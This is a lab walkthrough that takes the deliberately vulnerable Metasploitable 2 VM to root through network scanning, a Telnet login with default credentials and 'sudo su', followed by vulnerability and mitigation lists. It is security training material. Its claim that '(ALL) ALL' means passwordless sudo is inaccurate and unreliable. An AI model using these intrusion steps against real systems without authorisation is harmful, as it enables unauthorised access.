# Metasploitable 2 — Walkthrough

| Field | Detail |
|---|---|
| Machine | Metasploitable 2 |
| Purpose | Deliberately vulnerable training VM |
| OS | Linux |

## 🔍 Overview

Metasploitable 2 is an intentionally vulnerable Linux VM designed for security training. It exposes a large number of outdated, misconfigured, and backdoored services. This write-up covers the fastest path to root: default Telnet credentials combined with a passwordless sudo misconfiguration.

**Machine Details**

- Target IP: `192.168.1.100`
- Attacker (Kali) IP: `192.168.1.10`

---

## Step 1 – Network Discovery

```bash
arp-scan -l
```

**Result:** Metasploitable 2 identified at `192.168.1.100`.

---

## Step 2 – Port Scanning

```bash
nmap -sV -p- 192.168.1.100
```

**Open Ports (selected — the machine exposes numerous vulnerable services):**

| Port | Service | Note |
|---|---|---|
| 21/tcp | vsftpd 2.3.4 | Known backdoored version |
| 22/tcp | OpenSSH 4.7p1 | |
| 23/tcp | Telnet | Cleartext auth — easiest entry point |
| 25/tcp | Postfix smtpd | |
| 53/tcp | ISC BIND 9.4.2 | |
| 80/tcp | Apache httpd 2.2.8 | |
| 139/445/tcp | Samba 3.X | Enumerable |
| 1524/tcp | Metasploitable root shell | Direct unauthenticated root shell |
| 2121/tcp | ProFTPD 1.3.1 | |
| 3306/tcp | MySQL | |
| 3632/tcp | distccd | Known RCE vulnerability |
| 5900/tcp | VNC | |
| 6000/tcp | X11 | |
| 6667/tcp | UnrealIRCd | |
| 8787/tcp | Ruby DRb | |

This machine offers many redundant paths to compromise — the Telnet + sudo path below was the fastest.

---

## Step 3 – Telnet Login

```bash
telnet 192.168.1.100
```

**Logged in using the well-known default credentials:**

```
Username: msfadmin
Password: msfadmin
```

The login banner itself warns that this VM should never be exposed to an untrusted network.

---

## Step 4 – Check Sudo Privileges

```bash
sudo -l
```

**Result:**

```
User msfadmin may run the following commands on this host:
    (ALL) ALL
```

This meant `msfadmin` could run **any command as root, with no password required**.

---

## Step 5 – Escalate to Root

```bash
sudo su
```

**Result:** No password prompt — immediate root shell obtained.

---

## Step 6 – Verify Root Access

```bash
whoami
id
```

**Result:** `uid=0(root) gid=0(root)` — confirmed full root access.

---

## 🛡️ Key Vulnerabilities Identified

1. Telnet enabled, exposing credentials and traffic in cleartext
2. Default, well-known credentials (`msfadmin`/`msfadmin`)
3. Passwordless, unrestricted sudo access (`(ALL) ALL` with no password)
4. Numerous additional vulnerable/backdoored services offering alternative RCE paths (vsftpd 2.3.4 backdoor, distccd, UnrealIRCd, port 1524 root shell, etc.)
5. No hardening applied anywhere on the system — intentional, for training purposes

## 🩹 Mitigations

1. Never expose this or any intentionally vulnerable VM to an untrusted network
2. Always change default credentials before deploying any system
3. Disable unnecessary and legacy services (Telnet, RPC, X11, etc.)
4. Configure sudo properly — never grant unrestricted, passwordless `(ALL) ALL` access
5. Apply security patches regularly and retire outdated service versions
6. Use firewall rules to restrict access to only required services

---

## 🧰 Tools Used

`arp-scan` · `nmap` · `telnet`

## 🧠 Techniques Covered

Network discovery · Port scanning & service enumeration · Default credential exploitation · Sudo misconfiguration exploitation · Privilege escalation

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Network Discovery | ✅ |
| 2 | Port Scanning | ✅ |
| 3 | Telnet Login (Default Credentials) | ✅ |
| 4 | Check Sudo Privileges | ✅ |
| 5 | Escalate to Root | ✅ |
| 6 | Verify Root Access | ✅ |

*Writeup for educational purposes. Machine solved as part of Metasploit/security training practice.*
